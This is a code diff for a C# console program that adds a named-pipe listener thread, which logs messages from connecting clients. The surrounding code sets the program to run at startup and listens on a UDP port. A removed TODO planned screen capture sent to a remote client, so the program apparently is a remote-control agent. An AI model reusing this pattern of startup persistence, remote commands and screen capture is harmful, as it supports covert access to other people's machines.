@@ -2,6 +2,8 @@
 using Microsoft.Win32;
 using System;
 using System.Diagnostics;
+using System.IO;
+using System.IO.Pipes;
 using System.Net;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
@@ -57,14 +59,6 @@ namespace ConsoleApp3
         {
             
 
-            //Console.WriteLine("Listening");
-
-            /* TODO
-             * 
-             * 
-
-             * 4- this wasn't yet done in client side, but add a new command which will capture a screenshot of desktop, send it to client.
-             */
             setOnSetStartup();
             sckt = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
             
@@ -79,7 +73,9 @@ namespace ConsoleApp3
             };
 
             SetConsoleCtrlHandler(_consoleCtrlHandler, true);
-
+            //initialze pipe listener in a new thread
+            new Thread(new ThreadStart(intiPipeListener)).Start();
+            
             byte[] data = new byte[1024];
            
             endpoint = new IPEndPoint(IPAddress.Any, Constants.PORT_NO);
@@ -201,6 +197,52 @@ namespace ConsoleApp3
             }
             
                         
+
+        }
+
+        private static void intiPipeListener()
+        {
+            while (true)
+            {
+
+
+                NamedPipeServerStream pipeServer =
+                  new NamedPipeServerStream("testpipe", PipeDirection.InOut);
+
+                Console.Write("Waiting for client connection...");
+                pipeServer.WaitForConnection();
+
+                Console.WriteLine("Client connected.");
+                try
+                {
+                    // Read user input and send that to the client process.
+                    StreamWriter sw = new StreamWriter(pipeServer);
+                    StreamReader sr = new StreamReader(pipeServer);
+
+                    sw.AutoFlush = true;
+
+                    string message;
+                    while ((message = sr.ReadLine()) != null)
+                        Console.WriteLine("[CLIENT]: " + message);
+
+
+                    sr.Close();
+                    sw.Close();
+                }
+                // Catch the IOException that is raised if the pipe is broken
+                // or disconnected.
+                catch (IOException e)
+                {
+                    Console.WriteLine("ERROR: {0}", e.Message);
+                }
+                catch (System.ObjectDisposedException e1)
+                {
+                    Console.WriteLine("client disconncted");
+                }
+
+                pipeServer.Close();
+            }
+
 
         }
 
